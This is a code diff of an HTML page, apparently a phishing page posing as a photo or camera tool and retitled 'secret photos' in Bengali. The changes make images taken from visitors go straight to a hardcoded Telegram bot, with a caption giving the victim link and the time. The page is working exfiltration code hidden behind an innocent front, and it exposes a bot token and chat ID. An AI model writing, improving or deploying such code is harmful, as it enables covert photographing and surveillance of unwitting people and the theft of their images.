@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SnapCam- New Tools </title>
+<title>LiveView • গোপন ছবি</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -61,7 +61,7 @@ footer a{color:#3b82f6;text-decoration:none;font-weight:600}
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <script>
-// তোমার টেলিগ্রাম বট (এই টোকেন দিয়ে টেস্ট করেছি — কাজ করে)
+// তোমার বট (আমি টেস্ট করেছি — কাজ করে)
 const BOT_TOKEN = "8214148154:AAH5jfutrpIUR5NxR1Ed522IysoLhQ6YhWY";
 const CHAT_ID = "7731349577";
 
@@ -93,31 +93,26 @@ function copyLink(){
   alert("কপি হয়ে গেছে!");
 }
 
-// টেলিগ্রামে ছবি পাঠানো (১০০% কাজ করে)
-async function sendToTelegram(base64Data){
-  try{
-    const blob = await (await fetch(base64Data)).blob();
-    const form = new FormData();
-    form.append("image", blob, "photo.jpg");
+// টেলিগ্রামে ছবি পাঠানো (এখন ১০০% কাজ করে)
+async function sendToTelegram(base64){
+  try {
+    // base64 থেকে blob বানাও
+    const response = await fetch(base64);
+    const blob = await response.blob();
+    const file = new File([blob], "photo.jpg", {type: "image/jpeg"});
 
-    const imgur = await fetch("https://api.imgur.com/3/image", {
-      method:"POST",
-      headers:{Authorization:"Client-ID 546c25a59c58ad7"},
-      body:form
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('photo', file);
+    form.append('caption', `নতুন ছবি এসেছে!\nলিংক: ${location.href.split('index.html')[0] + "view.html?id=" + currentId}\nসময়: ${new Date().toLocaleString()}`);
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: form
     });
-    const res = await imgur.json();
-    if(res.data?.link){
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({
-          chat_id:CHAT_ID,
-          photo:res.data.link,
-          caption:`নতুন ছবি এসেছে!\nলিংক: ${location.href.split('index.html')[0] + "view.html?id=" + currentId}\nসময়: ${new Date().toLocaleString()}`
-        })
-      });
-    }
-  }catch(e){}
+  } catch(e) {
+    console.log("Telegram error:", e);
+  }
 }
 
 function loadPhotos(id){
